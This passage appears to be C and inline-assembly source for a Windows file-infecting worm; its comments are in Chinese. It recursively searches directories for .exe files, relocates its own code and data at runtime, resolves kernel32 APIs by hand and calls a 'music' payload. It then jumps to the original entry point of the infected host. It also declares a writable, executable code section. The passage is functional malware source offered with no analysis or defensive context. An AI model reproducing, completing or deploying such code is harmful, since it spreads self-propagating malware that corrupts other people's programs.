                ((tf13_fcat)lpfuncAddr[13])(subDirPath, &exp3[2]);
                ((tf13_fcat)lpfuncAddr[13])(subDirPath, fileInfo.cFileName);
                ((tf15_FindExeFilesRecursive)lpfuncAddr[15])(subDirPath, cnt); // 递归遍历子目录
            }
        } while (((tFindNextFileA12)lp_apiAddr[12])(hFind, &fileInfo));
        ((tFindClose13)lp_apiAddr[13])(hFind);
    }
}
void __declspec(naked) __cdecl newEp()//naked裸函数，开辟和释放堆栈由我们自己写。这会是我们最后处理的时候,真正的entrypoint
{
    DWORD* lpfuncAddr;
    DWORD* lp_apiAddr;
    __asm
    {
        //这里影响力堆栈
        push eax;
        push ebx;
        push ecx;
        mov  ecx, dword ptr[esp + 12]; //把进入的时候的那个特殊地址给我们准备好的全局变量
        push    ebp;
        mov     ebp, esp;
        sub     esp, 128;

        call label_reloc;
    label_reloc:
        pop ebx;

        lea eax, apiAddr;
        sub eax, label_reloc;//相对位置x;
        add eax, ebx;//实际ip地址 + 相对位置x;
        mov[eax], ecx; //后续操作

        //lpfuncAddr=funcAddr;
        lea eax, funcAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lpfuncAddr;
        mov[ecx], eax;

        //重定位lpapiAddr=apiAddr;
        lea eax, apiAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lp_apiAddr;
        mov[ecx], eax;


        //重定位那些自己写的函数
        push ebx;
        lea ecx, apiAddr;
        sub eax, ecx;
        push eax;//实际变量地址 - 老变量地址
        push 16; //长度
        lea eax, funcAddr;
        sub eax, label_reloc;
        add eax, ebx;
        push eax;//数组

        lea eax, f11_freloc;
        sub eax, label_reloc;
        add eax, ebx;
        call eax;


        //重定位字符串资源
        pop ebx;
        lea eax, apiAddr;
        sub eax, label_reloc;
        add eax, ebx;
        lea ecx, apiAddr;
        sub eax, ecx;
        push eax;//实际变量地址 - 老变量地址
        push 27; //长度
        lea eax, szAPIname;
        sub eax, label_reloc;
        add eax, ebx;
        push eax;//数组
        lea eax, f11_freloc;
        sub eax, label_reloc;
        add eax, ebx;
        call eax;

        pop ecx;
        pop ebx;
        pop eax;
    }
    ((tf3_GetKernelBase)lpfuncAddr[3])();
    ((tf10_initApi)lpfuncAddr[10])();
    ((tf8_SearchFile2)lpfuncAddr[8])();//他要获取别人的ep的

    ((tf12_music)lpfuncAddr[12])();


    lpfuncAddr[16] += ((tGetModuleHandleA14)lp_apiAddr[14])(0);
    __asm
    {
        //上一条蠕虫成功入侵的时候,会写入oep
        mov eax, lpfuncAddr;
        add eax, 4 * 16;
        mov eax, [eax];

        //释放栈
        mov     esp, ebp;//不能释放堆栈,因为前面开辟了,还得继续用的
        pop     ebp;

        jmp eax;

        //当前蠕虫,没有入侵成功的时候,不会动oep
        //当前蠕虫,入侵成功的时候,不应该破坏oep,但是可以动,动了要恢复

    }
}
#pragma code_seg()
#pragma comment(linker, "/SECTION:.D0g3,ERW")
int main() // newEp() 
{
    printf("EP:%08X\n", (DWORD32)newEp);
    apiAddr[0] = LoadLibraryA("kernel32.dll");
    if (apiAddr[0] == 0)
    {
        return 0;
    }
    f10_initApi();
    f8_SearchFile2();
    return 0;
}